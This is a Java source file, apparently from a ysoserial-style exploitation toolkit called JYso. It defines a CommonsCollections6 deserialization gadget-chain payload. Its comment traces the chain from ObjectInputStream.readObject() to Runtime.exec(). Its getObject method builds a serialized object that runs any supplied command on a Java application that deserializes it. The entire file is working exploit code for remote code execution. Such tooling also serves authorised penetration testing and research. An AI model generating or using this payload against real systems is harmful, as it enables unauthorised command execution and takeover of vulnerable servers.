package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import static com.qi4l.JYso.gadgets.AspectJWeaver2.getSerializableCC6;


/**
 * Gadget chain:
 * java.io.ObjectInputStream.readObject()
 * java.util.HashSet.readObject()
 * java.util.HashMap.put()
 * java.util.HashMap.hash()
 * org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 * org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 * org.apache.commons.collections.map.LazyMap.get()
 * org.apache.commons.collections.functors.ChainedTransformer.transform()
 * org.apache.commons.collections.functors.InvokerTransformer.transform()
 * java.lang.reflect.Method.invoke()
 * java.lang.Runtime.exec()
 * <p>
 * by @matthias_kaiser
 */
@SuppressWarnings({"rawtypes","unused"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class cc6 implements ObjectPayload<Serializable> {
    public Serializable getObject(String command) throws Exception {

        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
        return getSerializableCC6(entry);
    }
}
